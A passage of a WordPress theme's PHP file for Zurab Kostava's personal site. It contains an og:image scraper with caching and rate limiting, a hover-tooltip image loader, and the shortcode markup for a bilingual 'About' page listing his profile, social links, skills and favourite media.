        'https://open.spotify.com/artist/2exkZbmNqMKnT8LRWuxWgy?si=JGil1iZ5QuWjh7KMQkQYFQ' => 'https://i.scdn.co/image/ab6761610000e5eb55a94b7fa21c9dbb2b986229',
        'https://open.spotify.com/track/7iFRj7qUZ8KGQvRqRMc0nT?si=eb43fabe9f3c41d3' => 'https://i.scdn.co/image/ab67616d0000b273064ba59fb95930fd6fc03f7a',
        'https://open.spotify.com/artist/6Ghvu1VvMGScGpOUJBAHNH?si=nWy-0nnARR-Nn-C9T3diMw' => 'https://i.scdn.co/image/ab6761610000e5ebe3ac5eb948e78d9285d1dbdb',
        'https://open.spotify.com/artist/6UUrUCIZtQeOf8tC0WuzRy?si=0664fce6815243bf' => 'https://i.scdn.co/image/ab6761610000e5eb6e9247ebb1bd90c23fb776fc',
        'https://open.spotify.com/artist/0GDGKpJFhVpcjIGF8N6Ewt?si=3KxodPTPRjGlSqd0a3h0mg' => 'https://i.scdn.co/image/ab6761610000e5eb96c4949ee078fbef5d5adb68',
        'https://open.spotify.com/artist/1Q776wzj2mrtXrNu3iH6nk?si=lSTJwFIKTmKXZAXorDU3QA' => 'https://i.scdn.co/image/ab6761610000e5ebb1452e25406138c0b72ac9d1',
        'https://open.spotify.com/artist/1NCLweIUpq8knzemBwAwoo?si=j8nM7riYQ5qYyK6GkPGk3w' => 'https://i.scdn.co/image/ab6761610000e5eb252033f84cfdb23c409f08ab',
        'https://open.spotify.com/album/3B61kSKTxlY36cYgzvf3cP?si=io7cpz3lTVufwkNDfxO30w' => 'https://i.scdn.co/image/ab67616d0000b27381f04c407e0ec68e3dea6b2c',
        'https://open.spotify.com/album/6dVIqQ8qmQ5GBnJ9shOYGE?si=ZBWSZ5SgRGeBeuPsYXv2Ng' => 'https://i.scdn.co/image/ab67616d0000b273c8b444df094279e70d0ed856',
        'https://open.spotify.com/track/0Sg3UL7f40ulmTh0Xwr6qY?si=d3639b0b4b4f416e' => 'https://i.scdn.co/image/ab67616d0000b27381f04c407e0ec68e3dea6b2c',
        'https://open.spotify.com/track/20vEB3It4xYzKHlMecu6X1?si=15fc0ea6baec4282' => 'https://i.scdn.co/image/ab67616d0000b273c2decdb0e3ad934ad512abdd',
        'https://open.spotify.com/track/3KG9I4JXpDwNQOsotE3uLh?si=51e185c8adcf4d5a' => 'https://i.scdn.co/image/ab67616d0000b27358ebfd9621b687d56309c8d0',
        'https://www.youtube.com/user/marquesbrownlee' => 'https://yt3.googleusercontent.com/qu4TmIaYUlS41-dJ9gZ7DUR3nilvmB5_11i6OKSdvNnBNiyOusZP1bMN6ICnuxtjFBb6ioKgRQ=s900-c-k-c0x00ffffff-no-rj',
    );

    if ( isset($static_cache[$url]) ) {
        return $static_cache[$url];
    }

    $transient_key = 'zk_og_img_v9_' . md5( $url );
    $cached_image = get_transient( $transient_key );

    if ( false !== $cached_image ) {
        return $cached_image;
    }

    if ( ! $scrape ) {
        return false;
    }

    // Determine the best User-Agent
    $user_agent = 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)';
    if ( strpos( $url, 'wikipedia.org' ) !== false ) {
        $user_agent = 'ZurabKostavaThemeBot/1.0 (admin@zurabkostava.com)';
    }

    $response = wp_safe_remote_get( $url, array(
        'timeout'     => 15,
        'redirection' => 3,
        'user-agent'  => $user_agent
    ) );

    if ( is_wp_error( $response ) || wp_remote_retrieve_response_code( $response ) !== 200 ) {
        set_transient( $transient_key, '', HOUR_IN_SECONDS );
        return '';
    }

    $body = wp_remote_retrieve_body( $response );
    
    $image_url = '';
    if ( preg_match( '/<meta[^>]*property=[\"|\']og:image[\"|\'][^>]*content=[\"|\']([^\"^\']+)[\"|\'][^>]*>/i', $body, $matches ) ) {
        $image_url = $matches[1];
    } elseif ( preg_match( '/<meta[^>]*content=[\"|\']([^\"^\']+)[\"|\'][^>]*property=[\"|\']og:image[\"|\'][^>]*>/i', $body, $matches ) ) {
        $image_url = $matches[1];
    }

    $image_url = html_entity_decode( $image_url );

    if ( ! empty( $image_url ) ) {
        set_transient( $transient_key, $image_url, DAY_IN_SECONDS * 30 );
    } else {
        set_transient( $transient_key, '', MINUTE_IN_SECONDS ); // Reduced to 1 minute to recover faster from rate limits
    }

    return $image_url;
}

function zk_render_fav_list($option_key) {
    // Determine shape based on option key
    $shape = 'square';
    if ( in_array( $option_key, ['zk_fav_cinema', 'zk_fav_series', 'zk_fav_books'] ) ) {
        $shape = 'portrait';
    } elseif ( in_array( $option_key, ['zk_fav_bands', 'zk_fav_actors', 'zk_fav_writers', 'zk_fav_directors', 'zk_fav_artists', 'zk_fav_nerds', 'zk_fav_scientists', 'zk_fav_athletes', 'zk_fav_models'] ) ) {
        $shape = 'circle';
    }

    $is_ka = ( function_exists('zk_get_current_language') && zk_get_current_language() === 'ka' );
    $data = '';
    if ( $is_ka ) {
        $data = get_option($option_key . '_ka', '');
    }
    if ( empty( trim( $data ) ) ) {
        $data = get_option($option_key, '');
    }

    if (empty(trim($data))) {
        echo '<li><a href="#">[TBD]</a></li>';
        return;
    }
    $lines = explode("\n", $data);
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line)) continue;
        $parts = explode('|', $line);
        $name = trim($parts[0]);
        $url = isset($parts[1]) ? trim($parts[1]) : '#';
        
        $hover_attr = ' class="zk-fav-link"';
        $thumb_html = '';
        $thumb_dimensions = 'portrait' === $shape ? ' width="20" height="30"' : ' width="26" height="26"';
        if ( $url !== '#' ) {
            $og_image = zk_get_og_image( $url, false );
            
            if ( false !== $og_image && ! empty( $og_image ) ) {
                $optimized_img = 'https://wsrv.nl/?url=' . urlencode( $og_image ) . '&w=150&q=50&output=webp';
                $hover_attr = ' data-hover-image="' . esc_url( $optimized_img ) . '" class="zk-fav-link"';
                $thumb_html = '<img src="' . esc_url( $optimized_img ) . '" class="zk-fav-thumb" data-shape="' . esc_attr($shape) . '" loading="lazy" alt="" />';
            } elseif ( false === $og_image ) {
                $hover_attr = ' data-scrape-url="' . esc_url( $url ) . '" data-title="' . esc_attr( $name ) . '" data-shape="' . esc_attr($shape) . '" class="zk-fav-link"';
                $thumb_html = '<img src="" class="zk-fav-thumb" data-shape="' . esc_attr($shape) . '" loading="lazy" alt="" />';
            } else {
                $hover_attr = ' data-shape="' . esc_attr($shape) . '" class="zk-fav-link"';
                $thumb_html = '<img src="" class="zk-fav-thumb" data-shape="' . esc_attr($shape) . '" loading="lazy" alt="" />';
            }
        }
        
        if ( $thumb_html ) {
            $thumb_html = str_replace( '<img ', '<img' . $thumb_dimensions . ' decoding="async" ', $thumb_html );
        }
        echo '<li><a href="' . esc_url($url) . '" target="_blank" rel="noopener noreferrer"' . $hover_attr . '>' . $thumb_html . '<span>' . esc_html($name) . '</span></a></li>';
    }
}

add_action( 'wp_ajax_zk_fetch_og_image', 'zk_fetch_og_image_ajax' );
add_action( 'wp_ajax_nopriv_zk_fetch_og_image', 'zk_fetch_og_image_ajax' );

function zk_fetch_og_image_ajax() {
    if ( ! zk_request_within_rate_limit( 'og-image', 60, MINUTE_IN_SECONDS ) ) {
        wp_send_json_error( 'Too many requests', 429 );
    }

    if ( ! isset( $_POST['url'] ) ) {
        wp_send_json_error( 'No URL provided' );
    }
    
    $url = esc_url_raw( wp_unslash( $_POST['url'] ) );
    if ( ! zk_is_allowed_og_source_url( $url ) ) {
        wp_send_json_error( 'URL is not allowed', 400 );
    }

    // Pass scrape=true to explicitly perform the fetch
    $image_url = zk_get_og_image( $url, true );
    
    if ( ! empty( $image_url ) ) {
        wp_send_json_success( array( 'image' => $image_url ) );
    } else {
        wp_send_json_error( 'No image found' );
    }
}

function zk_fav_tooltip_script() {
    ?>
    <script>
    (function() {
        let tooltip = null;
        
        function getTooltip() {
            if (!tooltip) {
                tooltip = document.getElementById("zk-fav-tooltip");
                if (!tooltip) {
                    tooltip = document.createElement("div");
                    tooltip.id = "zk-fav-tooltip";
                    document.body.appendChild(tooltip);
                }
            }
            return tooltip;
        }

        document.addEventListener("mouseover", function(e) {
            const link = e.target.closest(".zk-fav-link");
            if (link) {
                const imgUrl = link.getAttribute("data-hover-image");
                if (imgUrl) {
                    const tt = getTooltip();
                    tt.innerHTML = '<img src="' + imgUrl + '" loading="lazy" alt="Preview">';
                    tt.classList.add("visible");
                }
            }
        });
        
        document.addEventListener("mousemove", function(e) {
            const link = e.target.closest(".zk-fav-link");
            if (link) {
                const tt = getTooltip();
                if (!tt.classList.contains("visible")) return;
                
                const xOffset = 20;
                const yOffset = 20;
                
                let left = e.clientX + xOffset;
                let top = e.clientY + yOffset;
                
                const tooltipRect = tt.getBoundingClientRect();
                
                // fallback dimensions before image loads fully
                const width = tooltipRect.width || 200; 
                const height = tooltipRect.height || 300;
                
                if (left + width > window.innerWidth) {
                    left = e.clientX - width - 10;
                }
                
                if (top + height > window.innerHeight) {
                    top = e.clientY - height - 10;
                }
                
                tt.style.left = left + "px";
                tt.style.top = top + "px";
            }
        });
        
        document.addEventListener("mouseout", function(e) {
            const link = e.target.closest(".zk-fav-link");
            if (link) {
                if (!link.contains(e.relatedTarget)) {
                    const tt = getTooltip();
                    tt.classList.remove("visible");
                    tt.innerHTML = "";
                }
            }
        });
        
        // Background scraper for missing images
        let isFetchingImages = false;
        async function fetchMissingImages() {
            if (isFetchingImages) return;
            
            const links = Array.from(document.querySelectorAll('.zk-fav-link[data-scrape-url]'));
            if (links.length === 0) return;
            
            isFetchingImages = true;
            const ajaxUrl = "<?php echo admin_url('admin-ajax.php'); ?>";
            
            const concurrencyLimit = 5; // Fast APIs can handle concurrency easily
            let currentIndex = 0;
            
            async function worker() {
                while (currentIndex < links.length) {
                    const link = links[currentIndex++];
                    const scrapeUrl = link.getAttribute('data-scrape-url');
                    const itemTitle = link.getAttribute('data-title');
                    
                    if (!scrapeUrl) continue;
                    
                    // Immediately remove to prevent duplicate fetching
                    link.removeAttribute('data-scrape-url');

                    let fastImage = null;

                    // 1. TRY FAST CLIENT-SIDE APIs FIRST (Bypass server completely)
                    if (itemTitle) {
                        const cleanTitle = encodeURIComponent(itemTitle.replace(/[()]/g, '').trim());
                        try {
                            if (scrapeUrl.includes('goodreads.com')) {
                                const res = await fetch(`https://www.googleapis.com/books/v1/volumes?q=intitle:${cleanTitle}&maxResults=1`);
                                const data = await res.json();
                                if (data.items && data.items.length > 0 && data.items[0].volumeInfo.imageLinks) {
                                    fastImage = data.items[0].volumeInfo.imageLinks.thumbnail || data.items[0].volumeInfo.imageLinks.smallThumbnail;
                                    fastImage = fastImage.replace('http:', 'https:');
                                }
                            } else if (scrapeUrl.includes('imdb.com')) {
                                const res = await fetch(`https://itunes.apple.com/search?term=${cleanTitle}&entity=movie,tvSeason,tvShow&limit=1`);
                                const data = await res.json();
                                if (data.results && data.results.length > 0) {
                                    fastImage = data.results[0].artworkUrl100.replace('100x100bb', '300x300bb');
                                }
                            }
                        } catch(e) {
                            console.error('Fast API failed', e);
                        }
                    }

                    if (fastImage) {
                        const optimizedImg = 'https://wsrv.nl/?url=' + encodeURIComponent(fastImage) + '&w=150&q=50&output=webp';
                        link.setAttribute('data-hover-image', optimizedImg);
                        const img = link.querySelector('.zk-fav-thumb');
                        if (img) img.src = optimizedImg;

                        continue; // Success! Skip the slow server fallback
                    }
                    
                    // 2. FALLBACK: IF FAST API FAILS, ASK SERVER TO SCRAPE IT
                    const formData = new FormData();
                    formData.append('action', 'zk_fetch_og_image');
                    formData.append('url', scrapeUrl);
                    
                    try {
                        const response = await fetch(ajaxUrl, {
                            method: 'POST',
                            body: formData
                        });
                        const data = await response.json();
                        
                        if (data.success && data.data.image) {
                            const optimizedImg = 'https://wsrv.nl/?url=' + encodeURIComponent(data.data.image) + '&w=150&q=50&output=webp';
                            link.setAttribute('data-hover-image', optimizedImg);
                            const img = link.querySelector('.zk-fav-thumb');
                            if (img) {
                                img.src = optimizedImg;
                            }
                        }
                    } catch (err) {
                        console.error('Error fetching og:image fallback', err);
                    }
                    
                    // Add delay ONLY for the server scraping fallback to avoid rate limiting
                    if (!fastImage) {
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    }
                }
            }
            
            const workers = [];
            for (let w = 0; w < concurrencyLimit; w++) {
                workers.push(worker());
            }
            await Promise.all(workers);
            isFetchingImages = false;
        }
        
        // Run once on load
        fetchMissingImages();
        
        // Handle SPA transitions
        const observer = new MutationObserver((mutations) => {
            let shouldFetch = false;
            mutations.forEach((mutation) => {
                if (mutation.addedNodes.length) shouldFetch = true;
            });
            if (shouldFetch) fetchMissingImages();
        });
        observer.observe(document.body, { childList: true, subtree: true });
        
    })();
    </script>
    <?php
}
add_action('wp_footer', 'zk_fav_tooltip_script');

function zk_about_page_shortcode() {
    $is_ka = ( function_exists('zk_get_current_language') && zk_get_current_language() === 'ka' );
    ob_start(); ?>

    <div class="zk-about-wrapper">
        <div class="zk-tabs-nav-container">
            <div class="zk-tabs-nav">
                <div class="zk-tab-highlight"></div>
                <button class="zk-tab-btn active" data-target="tab-identity"><?php echo $is_ka ? 'იდენტობა' : 'Identity'; ?></button>
                <button class="zk-tab-btn" data-target="tab-monologue"><?php echo $is_ka ? 'მონოლოგი' : 'Monologue'; ?></button>
                <button class="zk-tab-btn" data-target="tab-gallery"><?php echo $is_ka ? 'გალერეა' : 'Gallery'; ?></button>
            </div>
        </div>

        <div class="zk-tabs-content">

            <!-- TAB 1: IDENTITY (Bento Box Dashboard) -->
            <div class="zk-tab-panel active" id="tab-identity">
                <div class="zk-identity-dashboard">

                    <!-- Box 1: Vitals & Connect -->
                    <div class="zk-bento-box zk-bento-profile zk-col-span-2">
                        <div class="zk-bento-header">
                            <div class="zk-header-title">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                                <h2><?php echo $is_ka ? 'მონაცემები & კონტაქტი' : 'Vitals & Connect'; ?></h2>
                            </div>
                            <p class="zk-bento-desc"><?php 
                                if ($is_ka) {
                                    $desc_vitals_ka = get_option('zk_desc_vitals_ka', '');
                                    echo esc_html(!empty($desc_vitals_ka) ? $desc_vitals_ka : get_option('zk_desc_vitals', "ზურაბ კოსტავას ციფრული ID, სადაც ის ობიექტურად ბევრად უკეთ გამოიყურება, ვიდრე საკუთარ პასპორტში."));
                                } else {
                                    echo esc_html(get_option('zk_desc_vitals', "Zurab Kostava's digital ID, where he objectively looks much better than on his actual passport."));
                                }
                            ?></p>
                        </div>

                        <div class="zk-profile-inner">
                            <div class="zk-profile-content">
                                <ul class="zk-vitals-list">
                                    <li>
                                        <svg class="zk-vital-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
                                        <div class="zk-vital-text"><strong><?php echo $is_ka ? 'დაიბადა:' : 'Born:'; ?></strong> <span><?php 
                                            $vital_born = $is_ka ? get_option('zk_vital_born_ka', '') : '';
                                            echo esc_html(!empty($vital_born) ? $vital_born : get_option('zk_vital_born', '19.02.1995')); 
                                        ?></span></div>
                                    </li>
                                    <li>
                                        <svg class="zk-vital-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"></polygon></svg>
                                        <div class="zk-vital-text"><strong><?php echo $is_ka ? 'წარმოშობა:' : 'Origin:'; ?></strong> <span><?php 
                                            $vital_origin = $is_ka ? get_option('zk_vital_origin_ka', '') : '';
                                            echo esc_html(!empty($vital_origin) ? $vital_origin : ($is_ka ? 'ოზურგეთი, გურია, საქართველო' : get_option('zk_vital_origin', 'Ozurgeti, Guria, Georgia'))); 
                                        ?></span></div>
                                    </li>
                                    <li>
                                        <svg class="zk-vital-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                                        <div class="zk-vital-text"><strong><?php echo $is_ka ? 'ლოკაცია:' : 'Base:'; ?></strong> <span><?php 
                                            $vital_base = $is_ka ? get_option('zk_vital_base_ka', '') : '';
                                            echo esc_html(!empty($vital_base) ? $vital_base : ($is_ka ? 'თბილისი, საქართველო' : get_option('zk_vital_base', 'Tbilisi, Georgia'))); 
                                        ?></span></div>
                                    </li>
                                    <li>
                                        <svg class="zk-vital-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
                                        <div class="zk-vital-text"><strong><?php echo $is_ka ? 'სტუდია:' : 'Studio:'; ?></strong> <span><?php 
                                            $vital_studio = $is_ka ? get_option('zk_vital_studio_ka', '') : '';
                                            echo wp_kses_post(!empty($vital_studio) ? $vital_studio : ($is_ka ? 'კრეატიული ხელმძღვანელი @ <a href="https://zurabkostava.com/ka" target="_blank">Kostava Creative</a>' : get_option('zk_vital_studio', 'Creative Lead @ <a href="https://zurabkostava.com" target="_blank">Kostava Creative</a>'))); 
                                        ?></span></div>
                                    </li>
                                    <li>
                                        <svg class="zk-vital-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path></svg>
                                        <div class="zk-vital-text"><strong><?php echo $is_ka ? 'პოზიცია:' : 'Position:'; ?></strong> <span><?php 
                                            $vital_position = $is_ka ? get_option('zk_vital_position_ka', '') : '';
                                            echo wp_kses_post(!empty($vital_position) ? $vital_position : ($is_ka ? 'ვებ დიზაინერი @ <a href="https://emis.ge" target="_blank">EMIS Georgia</a>' : get_option('zk_vital_position', 'Web Designer @ <a href="https://emis.ge" target="_blank">EMIS Georgia</a>'))); 
                                        ?></span></div>
                                    </li>
                                    <li>
                                        <svg class="zk-vital-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg>
                                        <div class="zk-vital-text"><strong><?php echo $is_ka ? 'არქეტიპი:' : 'Archetype:'; ?></strong> <span><?php 
                                            $vital_archetype = $is_ka ? get_option('zk_vital_archetype_ka', '') : '';
                                            echo esc_html(!empty($vital_archetype) ? $vital_archetype : ($is_ka ? 'კომპოზიტორი, ვიზუალური არტისტი, ტექ გიკი' : get_option('zk_vital_archetype', 'Composer, Visual Artist, Tech Geek'))); 
                                        ?></span></div>
                                    </li>

                                </ul>
                            </div> <!-- /.zk-profile-content -->

                            <div class="zk-profile-photo">
                                <?php
                                $profile_url = get_option( 'zk_profile_img', 'https://via.placeholder.com/150x200' );
                                $profile_id = attachment_url_to_postid( $profile_url );
                                $profile_meta = $profile_id ? wp_get_attachment_metadata( $profile_id ) : array();
                                // The fixed photo frame remains the fallback for external images.
                                $profile_width = ! empty( $profile_meta['width'] ) ? (int) $profile_meta['width'] : 170;
                                $profile_height = ! empty( $profile_meta['height'] ) ? (int) $profile_meta['height'] : 220;
                                ?>
                                <img src="<?php echo esc_url( $profile_url ); ?>" width="<?php echo $profile_width; ?>" height="<?php echo $profile_height; ?>" decoding="async" alt="<?php echo $is_ka ? 'ზურაბ კოსტავა' : 'Zurab Kostava'; ?>" />
                            </div>
                        </div> <!-- /.zk-profile-inner -->

                        <div class="zk-connect-footer">
                            <div class="zk-social-bar">
                                <a href="<?php echo esc_url(get_option('zk_social_ig', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="Instagram"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg></a>
                                <a href="<?php echo esc_url(get_option('zk_social_fb', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="Facebook"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg></a>
                                <a href="<?php echo esc_url(get_option('zk_social_x', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="X (Twitter)"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
                                <a href="<?php echo esc_url(get_option('zk_social_linkedin', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="LinkedIn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" r="2"></circle></svg></a>
                                <a href="<?php echo esc_url(get_option('zk_social_youtube', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="YouTube"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 11.75a29 29 0 0 0 .46 5.33 2.78 2.78 0 0 0 1.94 2c1.72.46 8.6.46 8.6.46s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2 29 29 0 0 0 .46-5.33 29 29 0 0 0-.46-5.33z"></path><polygon points="9.75 15.02 15.5 11.75 9.75 8.48 9.75 15.02"></polygon></svg></a>
                                <a href="<?php echo esc_url(get_option('zk_social_spotify', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="Spotify"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.779-.179-.899-.539-.12-.421.18-.78.54-.9 4.56-1.021 8.52-.6 11.64 1.32.42.18.479.659.24 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.24 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.6.18-1.2.72-1.381 4.26-1.261 11.28-1.02 15.721 1.621.54.3.72.96.42 1.5-.3.54-.96.72-1.56.36z"/></svg></a>
                                <a href="<?php echo esc_url(get_option('zk_social_bandcamp', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="Bandcamp"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M0 18.75l7.437-13.5H24l-7.438 13.5H0z"/></svg></a>
                                <a href="<?php echo esc_url(get_option('zk_social_medium', '#')); ?>" class="zk-social-btn" target="_blank" rel="noopener" aria-label="Medium"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.54 12a6.8 6.8 0 01-6.77 6.82A6.8 6.8 0 010 12a6.8 6.8 0 016.77-6.82A6.8 6.8 0 0113.54 12zM20.96 12c0 3.54-1.51 6.42-3.38 6.42-1.87 0-3.39-2.88-3.39-6.42s1.52-6.42 3.39-6.42c1.87 0 3.38 2.88 3.38 6.42M24 12c0 3.17-.53 5.75-1.19 5.75-.66 0-1.19-2.58-1.19-5.75s.53-5.75 1.19-5.75C23.47 6.25 24 8.83 24 12z"/></svg></a>
                            </div>
                            <div class="zk-email-bar">
                                <span class="zk-email-label"><?php echo $is_ka ? 'კონტაქტი:' : 'Contact:'; ?></span>
                                <div class="zk-email-list">
                                    <a href="mailto:<?php echo esc_attr(get_option('zk_vital_email_1', 'zurab@kostavacreative.com')); ?>" class="zk-email-link">
                                        <?php echo esc_html(get_option('zk_vital_email_1', 'zurab@kostavacreative.com')); ?>
                                    </a>
                                    <a href="mailto:<?php echo esc_attr(get_option('zk_vital_email_2', 'zurabkostava1@gmail.com')); ?>" class="zk-email-link">
                                        <?php echo esc_html(get_option('zk_vital_email_2', 'zurabkostava1@gmail.com')); ?>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Box 2: SKILLS -->
                    <div class="zk-bento-box zk-bento-skills zk-col-span-2">
                        <div class="zk-bento-header">
                            <div class="zk-header-title">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
                                <h2><?php echo $is_ka ? 'უნარები' : 'Skills'; ?></h2>
                            </div>
                            <p class="zk-bento-desc"><?php 
                                if ($is_ka) {
                                    $desc_skills_ka = get_option('zk_desc_skills_ka', '');
                                    echo esc_html(!empty($desc_skills_ka) ? $desc_skills_ka : get_option('zk_desc_skills', "შესაძლებლობების მოკლე სია. ეს არ არის პორტფოლიოსთვის თავის მოწონება — აქ ძირითადად იმიტომ წერია, რომ თავად არ დაავიწყდეს რისი გაკეთება შეუძლია."));
                                } else {
                                    echo esc_html(get_option('zk_desc_skills', "A brief list of capabilities. This isn't a flex for the portfolio—it's mostly here so he doesn't forget what he can actually do."));
                                }
                            ?></p>
                        </div>
                        <div class="zk-tags-container">
                            <?php
                            $skills_raw = '';
                            if ($is_ka) {
                                $skills_raw = get_option('zk_skills_ka', '');
                            }
                            if (empty(trim($skills_raw))) {
                                $skills_raw = get_option('zk_skills', 'Music Production, Cinematography & Color Grading, UI/UX Design, Sound Design, Web Technologies, AI Workflows');
                            }
                            $skills = array_filter(array_map('trim', explode(',', $skills_raw)));
                            foreach ($skills as $skill) {
                                echo '<span class="zk-tag">' . esc_html($skill) . '</span>';
                            }
                            ?>
                        </div>
                    </div>

                    <!-- Box 3: The Curated Mind -->
                    <div class="zk-bento-box zk-bento-favorites zk-col-span-2">
                        <div class="zk-bento-header">
                            <div class="zk-header-title">
                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
                                <h2><?php echo $is_ka ? 'შერჩეული გონება' : 'The Curated Mind'; ?></h2>
                            </div>
                            <p class="zk-bento-desc"><?php 
                                if ($is_ka) {
                                    $desc_fav_ka = get_option('zk_desc_favorites_ka', '');
                                    echo esc_html(!empty($desc_fav_ka) ? $desc_fav_ka : get_option('zk_desc_favorites', "კულტურული გავლენები. საბოლოო სია, რომელიც ამტკიცებს მის განსაკუთრებულ გემოვნებას მედიაში (და დიახ, ამით საკმაოდ ამაყობს)."));
                                } else {
                                    echo esc_html(get_option('zk_desc_favorites', "Cultural influences. The definitive list that proves his exceptional taste in media (and yes, he is quite proud of it)."));
                                }
                            ?></p>
                        </div>

                        <div class="zk-favorites-grid">
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18"></rect><line x1="7" y1="2" x2="7" y2="22"></line><line x1="17" y1="2" x2="17" y2="22"></line><line x1="2" y1="12" x2="22" y2="12"></line><line x1="2" y1="7" x2="7" y2="7"></line><line x1="2" y1="17" x2="7" y2="17"></line><line x1="17" y1="17" x2="22" y2="17"></line><line x1="17" y1="7" x2="22" y2="7"></line></svg> <?php echo $is_ka ? 'კინო' : 'Cinema'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_cinema'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="15" rx="2" ry="2"></rect><polyline points="17 2 12 7 7 2"></polyline></svg> <?php echo $is_ka ? 'სერიალები' : 'Series'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_series'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
                                <h4 class="zk-fav-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg> <?php echo $is_ka ? 'წიგნები' : 'Books'; ?></h4>
                                <ol><?php zk_render_fav_list('zk_fav_books'); ?></ol>
                            </div>
                            <div class="zk-fav-col">
